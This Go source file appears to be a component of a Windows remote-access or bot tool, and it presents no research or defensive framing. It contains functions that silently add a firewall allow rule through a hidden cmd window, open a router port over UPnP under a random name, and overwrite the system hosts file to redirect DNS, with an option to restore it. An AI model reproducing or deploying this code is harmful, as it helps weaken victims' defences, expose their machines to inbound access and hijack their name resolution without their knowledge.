//name := "Program"
//file := "C:\\Users\\saturnsvoid\\Desktop\\program.exe"
//Must have Admin rights
package components

import (
	"fmt"
	"os/exec"
	"strings"
	"syscall"

	"github.com/NebulousLabs/go-upnp"
)

func addtoFirewall(name string, file string) bool {
	if isAdmin {
		cmd := fmt.Sprintf(`netsh advfirewall firewall add rule name="%s" dir=in action=allow program="%s" enable=yes`, name, file)
		CommandWork := exec.Command("cmd", "/C", cmd)
		CommandWork.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		History, _ := CommandWork.Output()
		if strings.Contains(string(History), "Ok.") {
			//NewDebugUpdate("New Firewall Entry Added: " + name)
			return true
		}
		return false
	}
	return false
}

func openPort(port int) (bool, string) { //Trys to Open given port using UPnP
	prt := uint16(port)
	name := "Server" + randomString(5, false)
	d, err := upnp.Discover()
	if err != nil {
		fmt.Println(err)
		return false, "Unable to Discover..."
	}
	err = d.Forward(prt, name)
	if err != nil {
		fmt.Println(err)
		return false, "Port may already be in use or blocked."
	}
	return true, "Opened Port!"
}

func editHost(data string, fix bool) {
	if isAdmin {
		if fix {
			if checkFileExist(winDirPath + hostFilePath + "hosts.bak") {
				_ = deleteFile(winDirPath + hostFilePath + "hosts")
				_ = renameFile(winDirPath+hostFilePath+"hosts.bak", "hosts")
				run("ipconfig //flushdns")
			}
		} else {
			if !checkFileExist(winDirPath + hostFilePath + "hosts.bak") {
				_ = renameFile(winDirPath+hostFilePath+"hosts", "hosts.bak")
				_ = createFileAndWriteData(winDirPath+hostFilePath+"hosts", []byte(data))
				run("ipconfig //flushdns")
			}
		}
	}
}
